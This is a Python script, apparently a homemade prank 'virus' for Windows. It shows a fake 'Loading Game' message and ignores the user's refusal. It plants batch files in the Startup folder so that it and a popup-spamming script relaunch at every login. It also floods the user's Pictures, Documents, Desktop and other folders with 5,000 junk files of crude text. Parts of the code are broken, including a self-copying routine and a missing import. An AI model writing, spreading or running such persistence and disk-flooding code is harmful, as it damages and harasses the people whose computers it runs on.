import re
from tkinter import messagebox
import os
import getpass
import random
import time

def popup_warning(title, message):
    messagebox.showwarning(title=title, message=message)

def popup_error(title, message):
    messagebox.showerror(title=title, message=message)

def get_file_path():
    return os.path.realpath(__file__)

def get_computer_name():
    return getpass.getuser()

def random_letters(amount):
    number = []
    for i in range(amount):
        number.append(random.choice("abcdefghijklmnopqrstuvwxyz"))
    number = str(number)
    number = number.replace("[","")
    number = number.replace("]","")
    number = number.replace("'","")
    number = number.replace(",","")
    number = number.replace(" ","")
    return number

def random_numbers(amount, int_or_str):
    number = []
    for i in range(amount):
      number.append(random.choice("0123456789"))
    number = str(number)
    number = number.replace("[","")
    number = number.replace("]","")
    number = number.replace("'","")
    number = number.replace(",","")
    number = number.replace(" ","")
    return number

def random_folder():
    USER_NAME = getpass.getuser()
    startup = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    pictures = r'C:\Users\%s\Pictures' % USER_NAME
    desktop = r'C:\Users\%s\Desktop' % USER_NAME
    downloads = r'C:\Users\%s\Downloads' % USER_NAME
    ThreeD_Objects = r'C:\Users\%s\3D Objects' % USER_NAME
    documents = r'C:\Users\%s\Documents' % USER_NAME
    music = r'C:\Users\%s\Music' % USER_NAME
    videos = r'C:\Users\%s\Videos' % USER_NAME
    trash = r'C:\Users\%s\Recylce Bin' % USER_NAME
    dir = random.choice([pictures,videos,downloads,documents,ThreeD_Objects,music,desktop]) 
    return dir

def random_extention():
    ext = ["coffeescript","log","dockercompose","docx","caniputmyballsinyajaws","rip","monke","F","txt","gay","gae","snort","py","js","e","ligma","ballz","c","exe","cpp","cs","pp","java","pp","r","d","f","html","css","php","ruby","rdp","rtf","word","docs","dart","diff","dockerfile","swift","rust","sql","beamed",random.choice("abcdefghijklmnopqrstuvwqyz"),random.choice("1234567890"),""]
    return random.choice(ext)

def wait(seconds):
    time.sleep(seconds)


def rickroll():
    print("Never gonna give you up")


try:
        
        ques = (messagebox.askyesno(title="WARNING", message="THIS IS A VIRUS! \nDO YOU WANT TO CONTINUE?"))
        
        if ques == False:
            messagebox.showwarning(title="WARNING", message="IDGAF LMFAO!")
        ques2 = True
        if ques == True:
            ques2 = (messagebox.askyesno(title="WARNING", message="ARE YOU SURE?"))
        
        if ques2 == False:
            messagebox.showwarning(title="WARNING", message="IDGAF LMFAO!")
        
        b = open(f'log.txt', "a")
        
        #popup_warning("WARNING","THIS IS A VIRUS. DO YOU WANT TO CONTINUE?")
        print("Loading Game... Please allow up to 5 miniutes")
        THIS_PATH = get_file_path()
        
        USER_NAME = get_computer_name()
        
        startup = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME # Get the startup path
        
        def add_to_startup(file_path, number):
          dir = random_folder()
        
          with open(f"{startup}\START{number}.bat", "w") as bat_file: # Create a start file inside the startup folder
                    bat_file.write(r'start "%s"' % file_path)
        
          b.write(f'{startup}\START{number}.bat\n') # Write log
        
          with open(f"{dir}\ERROR{number}.py", "w") as errorXD:  
                    errorXD.write("from tkinter import messagebox" + ('\nmessagebox.showwarning(title="Error", message="Sugondese Nuts")\nmessagebox.showerror(title="Error", message="Sugondese Nuts")\n' * 80))
         
          b.write(f'{dir}\ERROR{number}.py\n') # Write log
        
          with open(f"{startup}\START_ERROR{number}.bat", "w+") as bat_file: # Create a start file inside the startup folder
                    bat_file.write(f'python "{dir}\ERROR{number}.py"')
        
          b.write(f'{startup}\START_ERROR{number}.bat\n') # Write log
        
        
        def clone():
            new_dir = random_folder()
            number = random_letters(3)
        
            with open(f"{new_dir}\{number}.py") as new_file:
                new_file.write(r""" 
                

try:
        
        ques = (messagebox.askyesno(title="WARNING", message="THIS IS A VIRUS! \nDO YOU WANT TO CONTINUE?"))
        
        if ques == False:
            messagebox.showwarning(title="WARNING", message="IDGAF LMFAO!")
        ques2 = True
        if ques == True:
            ques2 = (messagebox.askyesno(title="WARNING", message="ARE YOU SURE?"))
        
        if ques2 == False:
            messagebox.showwarning(title="WARNING", message="IDGAF LMFAO!")
        
        b = open(f'log.txt', "a")
        
        #popup_warning("WARNING","THIS IS A VIRUS. DO YOU WANT TO CONTINUE?")
        print("Loading Game... Please allow up to 5 miniutes")
        THIS_PATH = get_file_path()
        
        USER_NAME = get_computer_name()
        
        startup = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME # Get the startup path
        
        def add_to_startup(file_path, number):
          dir = random_folder()
        
          with open(f"{startup}\START{number}.bat", "w") as bat_file: # Create a start file inside the startup folder
                    bat_file.write(r'start "%s"' % file_path)
        
          b.write(f'{startup}\START{number}.bat\n') # Write log
        
          with open(f"{dir}\ERROR{number}.py", "w") as errorXD:  
                    errorXD.write("from tkinter import messagebox" + ('\nmessagebox.showwarning(title="Error", message="Sugondese Nuts")\nmessagebox.showerror(title="Error", message="Sugondese Nuts")\n' * 80))
         
          b.write(f'{dir}\ERROR{number}.py\n') # Write log
        
          with open(f"{startup}\START_ERROR{number}.bat", "w+") as bat_file: # Create a start file inside the startup folder
                    bat_file.write(f'python "{dir}\ERROR{number}.py"')
        
          b.write(f'{startup}\START_ERROR{number}.bat\n') # Write log
        
        
        def clone():
            new_dir = random_folder()
            number = random_letters(3)
        
            with open(f"{new_dir}\{number}.py") as new_file:
                new_file.write(""" """)
        
            b.write(f"{new_dir}\{number}.py") # Write log
        
        
            with open(f"{startup}\{number}.py") as new_bat:
                new_bat.write(f'python "{new_dir}\{number}.py"')
                
            b.write(f'{startup}\{number}.py\n') # Write log
        
        
        for i in range(5):
            add_to_startup(THIS_PATH, number=random_letters(7))
        
        
        for i in range(5000):
            fol = random_folder()
            let_7 = random_letters(7)
            ext = random_extention()
            with open(f"{fol}\snort_{let_7}.{ext}", "w") as w:
                w.write("sugondese nuts\n" * 2000 + " ~ snort")
        
            b.write(f"{fol}\snort_{let_7}.{ext}\n") # Write log
            f = re.compile("[0-99]000") # Match for printing
            f = f.match(str(i))
            if "None" not in str(f) or "1000" in str(f):
                  print(f"Loading... Object #{i}/10000 |")
                  #clone()
                  #clone()
except Exception as error:
    print(error)
    pass
                
                """)
        
            b.write(f"{new_dir}\{number}.py") # Write log
        
        
            with open(f"{startup}\{number}.py") as new_bat:
                new_bat.write(f'python "{new_dir}\{number}.py"')
                
            b.write(f'{startup}\{number}.py\n') # Write log
        
        
        for i in range(5):
            add_to_startup(THIS_PATH, number=random_letters(7))
        
        
        for i in range(5000):
            fol = random_folder()
            let_7 = random_letters(7)
            ext = random_extention()
            with open(f"{fol}\snort_{let_7}.{ext}", "w") as w:
                w.write("sugondese nuts\n" * 2000 + " ~ snort")
        
            b.write(f"{fol}\snort_{let_7}.{ext}\n") # Write log
            f = re.compile("[0-99]000") # Match for printing
            f = f.match(str(i))
            if "None" not in str(f) or "1000" in str(f):
                  print(f"Loading... Object #{i}/10000 |")
                  #clone()
                  #clone()
except KeyboardInterrupt:
    webbrowser.open("https://piv.pivpiv.dk/")
except Exception as error:
    print(error)
    pass
